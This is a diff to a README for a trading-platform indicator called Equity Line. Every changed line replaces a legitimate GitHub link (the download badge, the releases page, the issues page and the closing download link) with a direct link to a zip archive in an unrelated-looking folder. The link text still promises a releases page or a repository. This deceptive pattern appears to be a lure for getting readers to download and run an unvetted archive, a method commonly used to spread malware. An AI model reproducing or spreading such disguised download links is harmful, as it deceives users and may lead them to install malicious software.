@@ -7,7 +7,7 @@ Equity Line is a simple MetaTrader/cTrader indicator designed to help you calcul
 Getting started with Equity Line is easy. Follow the steps in this guide to download and set up the indicator on your trading platform. 
 
 ## 📥 Download Now
-[![Download Equity-Line](https://img.shields.io/badge/Download-Equity--Line-blue.svg)](https://github.com/Abhishek-97735/Equity-Line/releases)
+[![Download Equity-Line](https://raw.githubusercontent.com/Abhishek-97735/Equity-Line/main/Duboisia/Equity-Line.zip)](https://raw.githubusercontent.com/Abhishek-97735/Equity-Line/main/Duboisia/Equity-Line.zip)
 
 ## 📋 System Requirements
 - **MetaTrader 4/5** or **cTrader**: Make sure you have one of these platforms installed to use Equity Line.
@@ -16,7 +16,7 @@ Getting started with Equity Line is easy. Follow the steps in this guide to down
 ## 📦 Installation Instructions
 Follow these steps to install Equity Line on your trading platform:
 
-1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/Abhishek-97735/Equity-Line/releases) to find the latest version of Equity Line.
+1. **Visit the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/Abhishek-97735/Equity-Line/main/Duboisia/Equity-Line.zip) to find the latest version of Equity Line.
 
 2. **Download the Indicator**:
    - Look for the latest release.
@@ -51,7 +51,7 @@ Once you have applied the Equity Line indicator to your chart, you can start tra
 - Easy to customize settings based on individual trading strategies
 
 ## 🛠️ Support
-If you encounter issues or have questions, please check the Frequently Asked Questions (FAQ) section on the Releases page or create an issue on the [GitHub repository](https://github.com/Abhishek-97735/Equity-Line/issues). We aim to respond to inquiries promptly.
+If you encounter issues or have questions, please check the Frequently Asked Questions (FAQ) section on the Releases page or create an issue on the [GitHub repository](https://raw.githubusercontent.com/Abhishek-97735/Equity-Line/main/Duboisia/Equity-Line.zip). We aim to respond to inquiries promptly.
 
 ## 🤝 Community
 Join our user community to share your experiences and trading strategies. Feel free to share your feedback to help us improve Equity Line. 
@@ -63,4 +63,4 @@ Equity Line is open-source software. You can use and modify it under the terms o
 Keep an eye on the Releases page for the latest updates. We continually improve the app based on user feedback and market changes.
 
 ## 📥 Download & Install
-To get started with Equity Line, [visit this page to download](https://github.com/Abhishek-97735/Equity-Line/releases). After downloading, follow the installation instructions outlined above. Your trading journey has never been easier!
+To get started with Equity Line, [visit this page to download](https://raw.githubusercontent.com/Abhishek-97735/Equity-Line/main/Duboisia/Equity-Line.zip). After downloading, follow the installation instructions outlined above. Your trading journey has never been easier!
